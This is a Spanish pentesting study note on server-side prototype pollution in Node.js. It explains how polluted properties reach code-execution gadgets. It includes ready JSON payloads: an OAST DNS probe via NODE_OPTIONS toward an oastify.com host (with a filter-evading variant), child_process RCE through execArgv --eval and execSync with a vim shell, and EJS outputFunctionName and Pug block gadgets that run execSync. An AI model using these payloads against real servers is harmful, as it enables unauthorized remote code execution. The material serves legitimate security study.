---
tags:
  - Web/Red-Team
  - Server-Side/Prototype-Pollution
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-17
Nota previa: "[[01 - Prototype Pollution server-side]]"
Nota siguiente: "[[03 - Detección, herramientas y prevención]]"
Area: "[[Prototype Pollution.base|Prototype Pollution]]"
---
---

Contaminar `Object.prototype` es medio camino. El otro medio es el **gadget**: en server-side, un fragmento de Node o de una librería popular que lee una propiedad no inicializada y la lleva a un *sink* de **ejecución de código** —no a `innerHTML` como en el navegador, sino a `child_process` o al compilador de un motor de plantillas—.

# Gadgets en `child_process` (el vector estrella)

Los métodos de `child_process` (`spawn`, `fork`, `exec`, `execSync`) aceptan un objeto de opciones. <mark style="background: #ADCCFFA6;">Cuando ese objeto no fija una opción, Node la lee de la cadena de prototipos</mark> —justo lo que contaminamos—. Al lanzar un proceso hijo, la rutina interna `normalizeSpawnArguments` itera el entorno incluyendo propiedades heredadas, y ahí se cuelan nuestras variables.

## Detectar un sink explotable sin romper nada (OAST)

El primer problema server-side es que no sabes si la app llega a lanzar un proceso hijo. Este payload de PortSwigger lo confirma provocando una **interacción DNS** vía `NODE_OPTIONS`:

```json
{
  "__proto__":{
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=TU-ID.oastify.com"
  }
}
```

<mark style="background: #FF5582A6;">Si tu Collaborator recibe la petición DNS, hay un sink de `child_process` vivo</mark> en algún punto de la app —aunque no sea el endpoint que tocaste—. Variante ofuscada, por si un *scraper* intermedio "limpia" los dominios de las requests:

```json
{"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"}
```

## De la interacción a la ejecución

Confirmado el sink, se escala a RCE según el método disponible:

- **`fork()`** acepta `execArgv` (argumentos de línea de comandos del hijo). Un `--eval` ejecuta JS arbitrario:

```json
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}
```

- **`execSync()`** lee `shell` e `input`. Eligiendo un shell que ejecute órdenes desde stdin (`vim`, `ex`) se ejecutan comandos del sistema:

```json
{"__proto__":{"shell":"vim","input":":! id\n"}}
```

- **`NODE_OPTIONS`** con `--require /ruta` carga un módulo arbitrario al arrancar el hijo; combinado con un fichero que controles (un `upload`, un log envenenado) da ejecución.

# Gadgets en motores de plantillas

Los *template engines* compilan la plantilla a una función JavaScript, leyendo opciones de compilación de un objeto: otro punto perfecto para propiedades heredadas. Es la frontera con la [[00 - Motores de plantillas e introducción a SSTI|SSTI]]: allí el atacante controla la **plantilla**; aquí, una **opción de compilación** heredada del prototipo —mismo sink de código, distinto camino—.

## EJS — `outputFunctionName` (CVE-2022-29078)

EJS usa `opts.outputFunctionName` como nombre de la función en el cuerpo del template compilado, **sin sanear**. Contaminarla inyecta código en ese cuerpo:

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
```

<mark style="background: #8000E1A6;">Cuando `ejs.renderFile()` construye la función del template, evalúa el JavaScript inyectado</mark> → RCE. Flujo típico: un `_.merge()` contamina `Object.prototype.outputFunctionName`, y el primer render posterior ejecuta.

## Pug/Jade — `block`

Pug lee bloques de la configuración durante la compilación:

```json
{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}}
```

`Handlebars`, `lodash.template` (vía `sourceURL`) y otros tienen gadgets equivalentes; <mark style="background: #FFB8EBA6;">el gadget concreto depende de la versión exacta de la librería</mark>.

> [!warning]+ El gadget vive en las dependencias, no en tu endpoint
> La contaminación y el sink suelen estar en **sitios distintos**: contaminas en un `POST /api/update` que hace `merge`, y el gadget dispara en un render de plantilla o un `child_process` de otra parte de la app —o de una dependencia transitiva—. Por eso la detección OAST de `child_process` es tan valiosa: revela sinks que no ves en el código que tocas. Es el mismo principio *out-of-band* que en [[03 - Explotación de SSRF|SSRF ciego]] o [[18 - Exfiltración de datos ciega (OOB)|XXE OOB]].

> [!info]+ Catálogos de gadgets
> No hay que memorizarlos. El repo [KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution) (del paper *Silent Spring*, USENIX 2023) cataloga gadgets de RCE, robo de datos y DoS por librería y versión —la referencia para saber qué buscar según el `package.json` del target—. Análisis práctico de los gadgets de EJS en [mizu.re](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce).

Con la explotación cubierta, falta lo más difícil en un target real: **detectar** la PP cuando no hay reflexión, con qué herramientas, y cómo se defiende: [[03 - Detección, herramientas y prevención]].
